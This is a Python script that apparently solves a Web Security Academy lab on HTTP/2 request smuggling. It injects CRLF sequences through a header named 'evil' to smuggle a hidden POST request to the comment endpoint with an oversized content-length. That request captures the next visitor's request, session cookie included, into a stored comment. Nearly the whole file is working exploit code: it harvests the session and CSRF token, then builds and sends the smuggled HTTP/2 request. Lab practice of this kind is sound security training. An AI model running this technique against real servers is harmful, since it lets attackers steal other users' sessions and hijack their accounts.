import re
import urllib.parse
import http.client
import ssl

import h2.connection
import h2.events
import certifi
import socket

LAB_ID = "???"

postId = 7


def GET_post() -> http.client.HTTPResponse:
    method, path = 'GET', '/post'
    host, port = f'{LAB_ID}.web-security-academy.net', 443
    query_params = [
        ('postId', postId),
    ]
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.5',
    }
    body = ''
    headers['Content-Length'] = str(len(body))
    connection = http.client.HTTPSConnection(host, port, context=ssl._create_unverified_context())
    connection.request(method, f"{path}?{urllib.parse.urlencode(query_params)}", body, headers)
    return connection.getresponse()


def smuggle_post_comment(
        session: str,
        csrf: str,
) -> http.client.HTTPResponse:
    method, path = 'POST', '/'
    host, port = f'{LAB_ID}.web-security-academy.net', 443
    headers = [
        (':method', method),
        (':path', path),
        (':authority', host),
        (':scheme', 'https'),
        ('accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'),
        ('accept-language', 'en-US,en;q=0.5'),
    ]
    smuggled = f"""POST /post/comment HTTP/1.1
content-length: 980
content-type: application/x-www-form-urlencoded
cookie: session={session}

postId={postId}&name=fjasduifh&email=fasdgad%40fadsf.com&website=https%3A%2F%2Ffasdfasdf.com&csrf={csrf}&comment=""" \
        .replace("\n", "\r\n")
    headers.append(('evil', f"xxx\r\n\r\n{smuggled}"))

    # generic socket and ssl configuration
    socket.setdefaulttimeout(15)
    ctx = ssl.create_default_context(cafile=certifi.where())
    ctx.set_alpn_protocols(['h2'])

    # open a socket to the server and initiate TLS/SSL
    s = socket.create_connection((host, port))
    s = ctx.wrap_socket(s, server_hostname=host)

    c = h2.connection.H2Connection()
    c.initiate_connection()
    s.sendall(c.data_to_send())

    c.send_headers(1, headers, end_stream=True)
    s.sendall(c.data_to_send())

    response_body = b''
    response_stream_ended = False
    status = None
    while not response_stream_ended:
        # read raw data from the socket
        data = s.recv(65536 * 1024)
        if not data:
            break

        # feed raw data into h2, and process resulting events
        events = c.receive_data(data)
        for event in events:
            print(event)
            if isinstance(event, h2.events.ResponseReceived):
                status = next(header[1] for header in event.headers if header[0] == b':status').decode()
            if isinstance(event, h2.events.DataReceived):
                # update flow control so the server doesn't starve us
                c.acknowledge_received_data(event.flow_controlled_length, event.stream_id)
                # more response body data received
                response_body += event.data
            if isinstance(event, h2.events.StreamEnded):
                # response body completed, let's exit the loop
                response_stream_ended = True
                break

    # tell the server we are closing the h2 connection
    c.close_connection()
    s.sendall(c.data_to_send())

    # close the socket
    s.close()
    return status


def post_csrf() -> tuple[str, str]:
    response = GET_post()
    cookie_header = response.getheader('set-cookie')
    session = re.findall(r'session=([a-zA-Z0-9]+);', cookie_header)[0]
    csrf = re.findall(r'name="csrf" value="([a-zA-Z0-9]+)"', response.read().decode('utf-8'))[0]
    return session, csrf


session, csrf = post_csrf()
status = smuggle_post_comment(session, csrf)
print(f"smuggling response status: {status}")
